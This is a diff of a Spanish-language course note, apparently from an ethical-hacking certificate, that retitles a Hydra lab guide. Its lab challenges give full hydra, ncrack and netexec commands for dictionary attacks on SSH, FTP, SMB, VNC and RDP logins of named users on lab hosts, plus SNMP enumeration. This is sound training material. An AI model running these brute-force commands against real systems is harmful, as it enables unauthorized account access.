@@ -1,21 +1,11 @@
 ---
-title: "🔍 Práctica: Auditoría de Protocolos de Acceso con THC-Hydra (SSH, FTP, HTTP)"
+title: "Guía Básica de Hydra"
 aliases:
-  - Auditoría de Protocolos de Acceso con THC-Hydra (SSH, FTP, HTTP)
-  - PoC hydra
+  - Guía Básica de Hydra
 tags:
   - ifct0109/pocs
   - auditoria
   - hydra
-  - fuerza-bruta
-  - autenticacion
----
-
-# 🔍 Práctica: Auditoría de Protocolos de Acceso con THC-Hydra (SSH, FTP, HTTP)
-
-> [!abstract] Resumen del Laboratorio
-> Arsenal técnico de auditoría y pentesting del Certificado IFCT0109: reconocimiento de infraestructura, captura y análisis de hashes, explotación, pivoting perimetral e investigación de desbordamientos de memoria en entornos controlados.
-
 ---
 
 # 🔐 Guía Básica de Hydra
@@ -109,7 +99,7 @@ Para probar Hydra de forma legal y segura, puedes usar laboratorios online como:
 
 * IP del objetivo: `hydra.local`
 
-Utiliza el diccionario minirock.txt.
+Utiliza el diccionario [minirock.txt](../../../archivos_descargados/recursos/minirock.txt).
 
 ```bash
 wget http://hydra.local/minirock.txt
@@ -129,6 +119,8 @@ ncrack -u ainoa -P minirock.txt ssh://hydra.local
 ncrack -u jason -P minirock.txt ssh://hydra.local
 ```
 
+---
+
 **Reto FTP:** Utiliza Hydra para descubrir las contraseñas de los usuarios `adam` y `susan` en un servidor FTP local.
 
 * Servicio FTP: transferencia de archivos entre sistemas.
@@ -147,6 +139,8 @@ ncrack -u adam -P minirock.txt -T 5 hydra.local -p 21
 ncrack -u susan -P minirock.txt -T 5 hydra.local -p 21
 ```
 
+---
+
 **Reto SMB:** Utiliza Hydra para descubrir la contraseña del usuario `labex` en un servidor SMB local.
 
 * Servicio SMB: compartición de archivos e impresoras en red.
@@ -163,6 +157,8 @@ Con netexec:
 netexec smb hydra.local -u labex -p ./minirock.txt
 ```
 
+---
+
 **Reto VNC:** VNC permite controlar escritorios de forma remota. Atacaremos este servicio con un diccionario.
 
 * Servicio VNC: control remoto de escritorios gráficos.
@@ -173,6 +169,8 @@ netexec smb hydra.local -u labex -p ./minirock.txt
 hydra -P minirock.txt vnc://hydra.local:5901 -t 4 -f
 ```
 
+---
+
 **Reto RDP:** El protocolo RDP permite acceso remoto a equipos Windows. Usaremos Netexec para lanzar el ataque.
 
 * Servicio RDP: escritorio remoto en sistemas Windows.
@@ -182,6 +180,8 @@ hydra -P minirock.txt vnc://hydra.local:5901 -t 4 -f
 ```bash
 netexec rdp victima.local -u ifct0109 -p ./minirock.txt
 ```
+
+---
 
 **Actividad:** Captura las banderas de los usuarios pedro, adam y labex. E investigar en el servicio SNMP.
 
@@ -223,9 +223,3 @@ snmpwalk -v2c -c secret hydra.local > snmp.txt && nano snmp.txt
 ```bash
 vncviewer hydra.local:5901
 ```
-
----
-
-## 🔗 Enlaces y Referencias
-* 🗂️ [[02 - MODULOS/05 - Prácticas (PoCs)|Catálogo General de Prácticas (PoCs)]]
-* 🧪 [[02 - MODULOS/04 - Hacking Ético|Módulo Central de Hacking Ético]]
